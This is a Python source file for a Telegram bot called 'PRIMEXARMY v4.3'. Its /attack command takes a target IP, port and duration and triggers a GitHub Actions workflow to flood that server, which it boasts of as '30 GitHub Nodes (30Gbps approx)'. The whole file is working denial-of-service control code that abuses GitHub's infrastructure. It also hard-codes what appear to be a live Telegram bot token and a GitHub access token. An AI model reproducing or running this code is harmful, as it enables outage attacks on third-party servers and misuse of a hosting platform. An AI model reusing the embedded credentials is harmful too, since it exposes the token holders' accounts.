import os, requests, time
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes

# ==================== CONFIG (BHARIEN) ====================
BOT_TOKEN = "8245702919:AAEtubkBb-vYwdPhSjquf6VscxZVb_ypeUI"
GITHUB_TOKEN = "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" # Classic Token with 'workflow' scope
REPO_OWNER = "vort3x"
REPO_NAME = "ha"
ADMIN_ID = 954990872 # Apni Numeric ID Daalein
# ==========================================================

BANNER = "⚔️ **PRIMEXARMY v4.3 - GITHUB ENGINE** ⚔️\n"

async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    # Only Admin can fire
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("❌ UN-AUTHORIZED ACCESS! CONTACT @PRIME_X_ARMY")
        return

    # Check Arguments
    if len(context.args) < 3:
        await update.message.reply_text("Usage: /attack <ip> <port> <time>")
        return

    host, port, duration = context.args[0], context.args[1], context.args[2]
    
    # GitHub Action Dispatch URL
    url = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/actions/workflows/main.yml/dispatches"
    
    headers = {
        "Authorization": f"token {GITHUB_TOKEN}",
        "Accept": "application/vnd.github.v3+json"
    }
    
    data = {
        "ref": "main", # Your branch name
        "inputs": {
            "host": host,
            "port": port,
            "time": duration
        }
    }

    # Trigger GitHub Workflow
    response = requests.post(url, headers=headers, json=data)

    if response.status_code == 204:
        msg = (f"{BANNER}✅ **ATTACK DEPLOYED!**\n\n"
               f"🎯 **Target:** `{host}:{port}`\n"
               f"⏱️ **Duration:** `{duration}s`\n"
               f"🛰️ **Power:** `30 GitHub Nodes (30Gbps approx)`\n\n"
               f"🚀 *Server freezing in progress...*")
    else:
        msg = f"❌ **GITHUB ERROR:** {response.status_code}\n`{response.text}`"

    await update.message.reply_text(msg, parse_mode="Markdown")

if __name__ == "__main__":
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("attack", attack))
    print("--- PRIMEXARMY v4.3 LIVE ON GITHUB ---")
    app.run_polling()